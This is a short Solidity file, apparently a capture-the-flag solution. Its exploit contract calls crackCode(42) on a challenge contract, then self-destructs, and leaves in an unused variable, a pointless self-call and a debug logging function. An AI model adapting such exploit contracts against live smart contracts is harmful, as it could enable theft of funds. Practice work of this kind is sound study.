// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "hardhat/console.sol";

interface IChallenge_ebaizel {
    function crackCode(uint8) external;
}

contract Exploit_ebaizel {
    IChallenge_ebaizel instance;

    constructor(IChallenge_ebaizel _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        uint8 ff = 0xff;
        address(this).call(abi.encodePacked(abi.encodeWithSelector(IChallenge_ebaizel.crackCode.selector, uint8(42))));
        instance.crackCode(42);

        selfdestruct(payable(address(this)));
    }

    function foo(uint8) external {
        console.log(msg.data.length + 28);
        (bytes32 sig, bytes32 data) = abi.decode(abi.encodePacked(bytes28(0), msg.data), (bytes32, bytes32));
        console.log(uint256(data));
    }

    receive() external payable {}
}
